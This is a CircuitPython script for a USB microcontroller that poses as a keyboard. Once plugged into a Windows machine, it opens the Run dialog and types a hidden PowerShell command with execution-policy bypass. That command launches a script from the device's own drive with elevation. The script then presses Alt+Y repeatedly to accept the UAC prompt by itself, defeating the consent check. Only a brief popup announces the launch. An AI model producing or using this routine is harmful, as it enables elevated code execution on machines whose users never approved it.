import time
import gc
import board
import digitalio
import usb_hid

# --- SAFETY DELAY ---
# 3 Seconds to unplug if something goes wrong
time.sleep(3.0)

# --- MEMORY CLEANUP (CRITICAL) ---
gc.collect()

# --- IMPORT DRIVERS ---
try:
    from adafruit_hid.keyboard import Keyboard
    from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
    from adafruit_hid.keycode import Keycode
except ImportError:
    # If drivers missing, blink fast forever
    while True:
        time.sleep(0.1)

# --- LED SETUP ---
led_pin = board.LED if hasattr(board, "LED") else (board.GP25 if hasattr(board, "GP25") else board.GP23)
led = digitalio.DigitalInOut(led_pin)
led.direction = digitalio.Direction.OUTPUT

# --- SETUP ---
try:
    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)
except Exception:
    # HID init failed — blink fast forever so the problem is visible.
    while True:
        led.value = not led.value
        time.sleep(0.15)

# --- PAYLOAD EXECUTION ---
led.value = True

# 1. Open Run Dialog
kbd.press(Keycode.GUI, Keycode.R)
time.sleep(0.1)
kbd.release_all()

# 2. Wait for Run Box
time.sleep(1.5)

# 3. Type Command (streamed in chunks to avoid MemoryError)
# Ctrl+Shift+Enter (step 4) runs this elevated directly, so no
# inner Start-Process -Verb RunAs is needed — one UAC prompt total.
layout.write("powershell -W Hidden -ExecutionPolicy Bypass -C \"")
# Show a 3-second auto-closing popup so the user knows the device is active.
layout.write("(New-Object -ComObject WScript.Shell).Popup('Launching Rounding Util USB...',3,'TA Tools',64)|Out-Null;")
layout.write("$d=(Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter; ")
layout.write("& ($d+':\\ROOT\\Launch.ps1')\"")

# 4. Launch elevated via Ctrl+Shift+Enter — triggers UAC prompt
time.sleep(0.5)
kbd.press(Keycode.LEFT_CONTROL, Keycode.LEFT_SHIFT, Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

# 5. Accept UAC — press Alt+Y up to 4 times, 3 s apart.
#    Handles fast (<3 s) and slow (up to ~12 s) popup timing.
#    Extra presses after dismissal land on a hidden window and are harmless.
for _ in range(4):
    time.sleep(3.0)
    kbd.press(Keycode.ALT, Keycode.Y)
    time.sleep(0.1)
    kbd.release_all()

led.value = False